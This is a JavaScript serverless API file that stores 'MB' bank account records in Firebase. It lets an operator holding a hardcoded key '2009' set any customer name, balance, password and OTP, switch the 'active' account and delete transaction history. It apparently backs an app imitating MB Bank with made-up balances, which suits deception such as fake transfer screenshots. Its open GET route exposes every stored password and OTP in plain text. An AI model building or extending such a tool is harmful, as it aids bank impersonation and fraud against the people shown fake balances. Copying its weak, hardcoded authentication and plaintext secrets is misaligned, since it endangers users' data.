const FIREBASE_URL = 'https://sfsdfsf-c4c13-default-rtdb.asia-southeast1.firebasedatabase.app/mbbank';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  // GET: Fetch all accounts, active account, and root status
  if (req.method === 'GET') {
    try {
      const [accsRes, activeRes, rootRes] = await Promise.all([
        fetch(`${FIREBASE_URL}/accounts.json?ts=${Date.now()}`, { cache: 'no-store' }),
        fetch(`${FIREBASE_URL}/active_account.json?ts=${Date.now()}`, { cache: 'no-store' }),
        fetch(`${FIREBASE_URL}.json?ts=${Date.now()}`, { cache: 'no-store' })
      ]);
      const accounts = accsRes.ok ? (await accsRes.json()) || {} : {};
      const activeAccount = activeRes.ok ? (await activeRes.json()) || '1800123123' : '1800123123';
      const root = rootRes.ok ? (await rootRes.json()) || {} : {};

      const currentActive = accounts[activeAccount] || {};
      const actualBal = typeof currentActive.balance === 'number' 
        ? currentActive.balance 
        : (typeof root.balance === 'number' ? root.balance : 0);

      return res.status(200).json({
        success: true,
        code: 0,
        active_account: activeAccount,
        activeAccount: activeAccount,
        accounts: accounts,
        balance: actualBal,
        customerName: currentActive.customerName || root.customerName || 'NGUYEN NGOC TRI',
        accountNumber: activeAccount
      });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch (e) { body = {}; }
  }
  body = body || {};

  // Bảo vệ cổng Admin bằng mã khóa bảo mật
  const adminKey = String(req.headers['x-admin-key'] || body.admin_key || body.adminKey || body.key || '').trim();
  if (adminKey !== '2009') {
    return res.status(401).json({ success: false, code: 401, message: 'Mã khóa bảo mật không chính xác' });
  }

  const action = body.action || 'save_account';

  if (action === 'verify_key') {
    return res.status(200).json({ success: true, code: 0, message: 'Xác thực thành công' });
  }

  // ACTION: SET ACTIVE ACCOUNT
  if (action === 'set_active') {
    const accNum = String(body.accountNumber || body.account_number || body.stk || '').replace(/\D/g, '');
    if (!accNum) {
      return res.status(400).json({ success: false, code: 400, message: 'Thiếu số tài khoản accountNumber' });
    }

    try {
      // 1. Read account details first
      const accRes = await fetch(`${FIREBASE_URL}/accounts/${accNum}.json?ts=${Date.now()}`);
      let accData = accRes.ok ? await accRes.json() : null;

      if (!accData) {
        accData = {
          accountNumber: accNum,
          username: accNum,
          accountName: body.accountName || 'THÀNH VIÊN MB',
          customerName: body.accountName || 'THÀNH VIÊN MB',
          balance: Number.isFinite(Number(body.balance)) ? Number(body.balance) : 0,
          password: String(body.password || '123456').trim(),
          phone: String(body.phone || accNum).trim(),
          otp: String(body.otp || '111111').trim(),
          tier: body.tier || 'MB Priority Digital',
          bankCode: 'MB',
          updatedAt: new Date().toISOString()
        };
        await fetch(`${FIREBASE_URL}/accounts/${accNum}.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(accData)
        });
      }

      const activeBal = typeof accData.balance === 'number' ? accData.balance : 0;

      // 2. Set active_account & synchronize root
      await Promise.all([
        fetch(`${FIREBASE_URL}/active_account.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(accNum)
        }),
        fetch(`${FIREBASE_URL}.json`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            accountNumber: accNum,
            username: accNum,
            accountName: accData.accountName || accData.customerName || 'THÀNH VIÊN MB',
            customerName: accData.customerName || accData.accountName || 'THÀNH VIÊN MB',
            balance: activeBal,
            phone: accData.phone || accNum,
            otp: accData.otp || '111111',
            password: accData.password || '123456',
            tier: accData.tier || 'MB Priority Digital',
            active_account: accNum,
            activeAccount: accNum,
            updatedAt: new Date().toISOString()
          })
        }),
        fetch(`https://sfsdfsf-c4c13-default-rtdb.asia-southeast1.firebasedatabase.app/balance.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(activeBal)
        })
      ]);

      return res.status(200).json({
        success: true,
        code: 0,
        message: `Đã kích hoạt tài khoản ${accNum} làm tài khoản chính`,
        active_account: accNum,
        account: accData
      });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // ACTION: DIRECT BALANCE UPDATE
  if (action === 'update_balance') {
    const accNum = String(body.accountNumber || body.account_number || body.stk || '').replace(/\D/g, '');
    const newBal = Number(body.balance);

    if (!accNum || !Number.isFinite(newBal) || newBal < 0) {
      return res.status(400).json({ success: false, code: 400, message: 'Số tài khoản hoặc số dư không hợp lệ' });
    }

    try {
      const activeRes = await fetch(`${FIREBASE_URL}/active_account.json`);
      const activeAcc = activeRes.ok ? String(await activeRes.json()).replace(/\D/g, '') : '';

      const promises = [
        fetch(`${FIREBASE_URL}/accounts/${accNum}.json`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            balance: newBal,
            updatedAt: new Date().toISOString()
          })
        })
      ];

      // Nếu tài khoản được cập nhật đang là active account, cập nhật luôn root
      if (accNum === activeAcc || !activeAcc) {
        promises.push(
          fetch(`${FIREBASE_URL}.json`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              balance: newBal,
              updatedAt: new Date().toISOString()
            })
          }),
          fetch(`https://sfsdfsf-c4c13-default-rtdb.asia-southeast1.firebasedatabase.app/balance.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(newBal)
          })
        );
      }

      await Promise.all(promises);

      return res.status(200).json({
        success: true,
        code: 0,
        message: `Đã cập nhật số dư tài khoản ${accNum} thành ${newBal.toLocaleString('vi-VN')} VND`,
        balance: newBal
      });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // ACTION: EDIT / UPDATE ACCOUNT DETAILS
  if (action === 'update_account') {
    const accNum = String(body.accountNumber || body.account_number || body.stk || '').replace(/\D/g, '');
    if (!accNum) {
      return res.status(400).json({ success: false, code: 400, message: 'Missing accountNumber' });
    }

    try {
      const accRes = await fetch(`${FIREBASE_URL}/accounts/${accNum}.json`);
      const existing = accRes.ok ? (await accRes.json()) || {} : {};

      const updated = {
        ...existing,
        accountName: body.customerName ? body.customerName.trim().toUpperCase() : existing.accountName,
        customerName: body.customerName ? body.customerName.trim().toUpperCase() : existing.customerName,
        password: body.password ? String(body.password).trim() : existing.password,
        phone: body.phone ? String(body.phone).trim() : existing.phone,
        otp: body.otp ? String(body.otp).trim() : existing.otp,
        tier: body.tier || existing.tier || 'MB Priority Digital',
        balance: Number.isFinite(Number(body.balance)) ? Number(body.balance) : existing.balance,
        updatedAt: new Date().toISOString()
      };

      await fetch(`${FIREBASE_URL}/accounts/${accNum}.json`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updated)
      });

      // Kiểm tra nếu là active account thì sync root
      const activeRes = await fetch(`${FIREBASE_URL}/active_account.json`);
      const activeAcc = activeRes.ok ? String(await activeRes.json()).replace(/\D/g, '') : '';
      if (accNum === activeAcc) {
        await fetch(`${FIREBASE_URL}.json`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            accountName: updated.customerName,
            customerName: updated.customerName,
            password: updated.password,
            phone: updated.phone,
            otp: updated.otp,
            tier: updated.tier,
            balance: updated.balance,
            updatedAt: updated.updatedAt
          })
        });
      }

      return res.status(200).json({
        success: true,
        code: 0,
        message: `Đã cập nhật thông tin tài khoản ${accNum}`,
        account: updated
      });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // ACTION: DELETE ACCOUNT
  if (action === 'delete_account') {
    const accNum = String(body.accountNumber || body.account_number || body.stk || '').replace(/\D/g, '');
    if (!accNum) {
      return res.status(400).json({ success: false, code: 400, message: 'Thiếu số tài khoản' });
    }
    try {
      await fetch(`${FIREBASE_URL}/accounts/${accNum}.json`, { method: 'DELETE' });
      return res.status(200).json({ success: true, code: 0, message: `Đã xóa tài khoản ${accNum}` });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // ACTION: CLEAR TRANSACTIONS
  if (action === 'clear_transactions') {
    const accNum = String(body.accountNumber || body.account_number || '').replace(/\D/g, '');
    try {
      if (accNum) {
        await fetch(`${FIREBASE_URL}/accounts/${accNum}/transactions.json`, { method: 'DELETE' });
      } else {
        await fetch(`${FIREBASE_URL}/transactions.json`, { method: 'DELETE' });
      }
      return res.status(200).json({ success: true, code: 0, message: 'Đã xóa toàn bộ lịch sử giao dịch' });
    } catch (err) {
      return res.status(500).json({ success: false, code: 500, error: err.message });
    }
  }

  // DEFAULT ACTION: SAVE / CREATE ACCOUNT
  const rawAcc = body.accountNumber || body.account_number || body.stk || body.username || '';
  const accNum = String(rawAcc).replace(/\D/g, '');
  if (!accNum) {
    return res.status(400).json({ success: false, code: 400, message: 'Số tài khoản không hợp lệ' });
  }

  // Lấy dữ liệu cũ nếu đang sửa
  let oldAcc = {};
  try {
    const oldRes = await fetch(`${FIREBASE_URL}/accounts/${accNum}.json`);
    if (oldRes.ok) oldAcc = (await oldRes.json()) || {};
  } catch(e) {}

  const name = (body.customerName || body.accountName || body.account_name || body.name || oldAcc.customerName || 'THÀNH VIÊN MB').trim().toUpperCase();
  // KHÔNG DÙNG 950000000 LÀM DEFAULT NỮA - DÙNG SỐ DƯ CŨ HOẶC 0
  const bal = Number.isFinite(Number(body.balance)) ? Number(body.balance) : (typeof oldAcc.balance === 'number' ? oldAcc.balance : 0);
  const tier = body.tier || oldAcc.tier || 'MB Priority Digital';
  const password = String(body.password || body.mat_khau || oldAcc.password || '123456').trim();
  const phone = String(body.phone || body.sdt || body.so_dien_thoai || oldAcc.phone || accNum).trim();
  const otp = String(body.otp || body.ma_otp || oldAcc.otp || '111111').trim();
  const setActive = body.set_active !== false;

  try {
    const accountRecord = {
      accountNumber: accNum,
      username: accNum,
      password: password,
      phone: phone,
      sdt: phone,
      otp: otp,
      accountName: name,
      customerName: name,
      balance: bal,
      tier: tier,
      bankCode: 'MB',
      updatedAt: new Date().toISOString()
    };

    // 1. Lưu vào /mbbank/accounts/<accNum>.json
    await fetch(`${FIREBASE_URL}/accounts/${accNum}.json`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(accountRecord)
    });

    // 2. Nếu setActive, cập nhật active_account và đồng bộ root
    if (setActive) {
      await Promise.all([
        fetch(`${FIREBASE_URL}/active_account.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(accNum)
        }),
        fetch(`${FIREBASE_URL}.json`, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            accountNumber: accNum,
            username: accNum,
            password: password,
            phone: phone,
            sdt: phone,
            otp: otp,
            accountName: name,
            customerName: name,
            balance: bal,
            active_account: accNum,
            activeAccount: accNum,
            updatedAt: new Date().toISOString()
          })
        }),
        fetch(`https://sfsdfsf-c4c13-default-rtdb.asia-southeast1.firebasedatabase.app/balance.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(bal)
        })
      ]);
    }

    return res.status(200).json({
      success: true,
      code: 0,
      status: 'success',
      message: `Đã lưu tài khoản ${accNum} [${name}] vào hệ thống thành công`,
      data: accountRecord
    });
  } catch (err) {
    return res.status(500).json({ success: false, code: 500, error: err.message });
  }
}
